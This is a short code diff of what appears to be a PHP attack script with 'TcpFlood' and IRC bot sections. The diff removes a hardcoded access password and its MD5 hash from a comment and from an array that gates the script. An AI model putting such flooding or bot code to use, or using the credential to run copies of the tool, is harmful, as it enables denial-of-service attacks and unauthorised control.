@@ -15,8 +15,6 @@ if(isset($_GET['ver'])){echo '<HTML><HEAD><TITLE>'.$EE[2].'</TITLE></HEAD><BODY>
 *TcpFlood
 */
 
-// PassWord: xxt0DfAnarchyGhost
-// MD5     : 7d17ba36edb181278ede8df80287288e
 
 /*IRC*/
 /*
@@ -60,7 +58,7 @@ echo "not online\n";
 
 
 $EE=array(
-	"7d17ba36edb181278ede8df80287288e",
+	"",
 	"Deffy0h - Save: Colder | Plastyne | SM0ld3R | N0v3",
 );
 
